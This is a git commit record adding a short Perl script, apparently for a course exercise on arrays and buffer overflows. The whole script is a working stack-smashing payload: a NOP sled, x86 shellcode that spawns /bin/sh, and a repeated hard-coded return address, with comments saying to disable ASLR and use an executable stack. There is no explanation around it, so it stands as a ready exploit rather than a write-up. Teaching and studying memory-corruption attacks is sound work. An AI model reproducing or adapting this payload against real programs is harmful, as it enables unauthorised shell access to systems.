97930a3369d376e6075beb8eaaf0428a0e703345
rigidrock <hjuang007@gmail.com>
2015-04-28 15:05:24 +0800

    Create exbuf.pl

---
+++ 3.Array-and-Pointer/bufover/exbuf.pl
@@ -0,0 +1,12 @@
+#! /usr/bin/perl
+# disable ASLR & compile with execstack
+# Work on debian
+
+$shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
+$addr="\x80\xf6\xff\xbf";
+$nop="\x90";
+
+$buf="$nop"x120;
+$buf.="$shellcode";
+$buf.="$addr"x32;
+print $buf;
